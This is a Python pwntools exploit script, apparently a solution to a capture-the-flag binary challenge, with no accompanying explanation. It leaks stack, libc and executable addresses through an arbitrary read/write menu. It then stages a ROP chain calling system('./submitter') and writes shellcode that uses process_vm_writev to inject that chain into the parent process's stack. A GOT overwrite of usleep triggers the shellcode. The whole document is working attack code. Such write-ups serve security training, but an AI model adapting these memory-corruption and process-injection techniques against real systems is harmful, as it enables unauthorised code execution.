#!/usr/bin/env python3
from pwn import *

exe = ELF("./challenge")
libc = ELF("./libc.so.6")

context.binary = exe

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

p = remote(HOST, int(PORT))
# p = gdb.debug([exe.path], gdbscript="""
# set follow-fork-mode parent
# b fork
# c
#               """)
assert p

def read(addr):
    p.sendlineafter(b'Choice: \n', b'1')
    p.sendlineafter(b'Address: \n', hex(addr).encode())
    p.recvuntil(b'Value: ')
    return int(p.recvline().strip(), 16)

def write(addr, data):
    p.sendlineafter(b'Choice: \n', b'2')
    p.sendlineafter(b'Value: \n', hex(data).encode())
    p.sendlineafter(b'Address: \n', hex(addr).encode())

stack = read(0)
print(f"stack: {hex(stack)}")
libc.address = read(stack - 0x70) - +0x1e40 - 0x28000
print(f"libc: {hex(libc.address)}")
exe.address = read(stack-0x20) - 0x1285
print(f"exe: {hex(exe.address)}")

SHELLCODE_LOCATION = exe.address + 0x1488
RETADDR = stack - 0x110
SUBMITTER = RETADDR + 0x30

def pad(s):
    return s + b'\x00' * (8 - len(s) % 8)

stack = stack & ~0xff
stack -= 0x400

write(stack, u64(b'./submit'))
write(stack+8, stack)
write(stack+16, 8)
write(stack+24, SUBMITTER) # change
write(stack+32, 8) # change

write(stack+40, u64(b'ter\x00\x00\x00\x00\x00'))
write(stack+40+8, stack+40)
write(stack+40+16, 8)
write(stack+40+24, SUBMITTER+8) # change
write(stack+40+32, 8) # change

r = ROP(libc)

write(stack+80, r.find_gadget(['pop rdi', 'ret']).address)
write(stack+80+8, stack+80)
write(stack+80+16, 8)
write(stack+80+24, RETADDR) # change
write(stack+80+32, 8) # change
print(hex(RETADDR))

write(stack+120, SUBMITTER)
write(stack+120+8, stack+120)
write(stack+120+16, 8)
write(stack+120+24, RETADDR+8) # change
write(stack+120+32, 8) # change

SYSTEM = libc.address + 0x50902

write(stack+160, SYSTEM)
write(stack+160+8, stack+160)
write(stack+160+16, 8)
write(stack+160+24, RETADDR+16) # change
write(stack+160+32, 8) # change

shellcode = pad(asm(f"""
mov rax, SYS_getppid
syscall
mov r14, rax
mov rdi, r14
mov rsi, {stack+8}
mov rdx, 1
mov r10, {stack+24}
mov r8, 1
mov r9, 0
mov rax, SYS_process_vm_writev
syscall
mov rdi, r14
mov rsi, {stack+40+8}
mov rdx, 1
mov r10, {stack+40+24}
mov r8, 1
mov r9, 0
mov rax, SYS_process_vm_writev
syscall
mov rdi, r14
mov rsi, {stack+80+8}
mov rdx, 1
mov r10, {stack+80+24}
mov r8, 1
mov r9, 0
mov rax, SYS_process_vm_writev
syscall
mov rdi, r14
mov rsi, {stack+120+8}
mov rdx, 1
mov r10, {stack+120+24}
mov r8, 1
mov r9, 0
mov rax, SYS_process_vm_writev
syscall
mov rdi, r14
mov rsi, {stack+160+8}
mov rdx, 1
mov r10, {stack+160+24}
mov r8, 1
mov r9, 0
mov rax, SYS_process_vm_writev
syscall
""") + asm(shellcraft.exit(0)))
shellcode = [shellcode[i:i+8] for i in range(0, len(shellcode), 8)]

for i, s in enumerate(shellcode):
    write(SHELLCODE_LOCATION + i*8, u64(s))

# pause()
write(exe.got['usleep'], SHELLCODE_LOCATION)
p.sendlineafter(b'Choice: \n', b'3')

p.interactive()
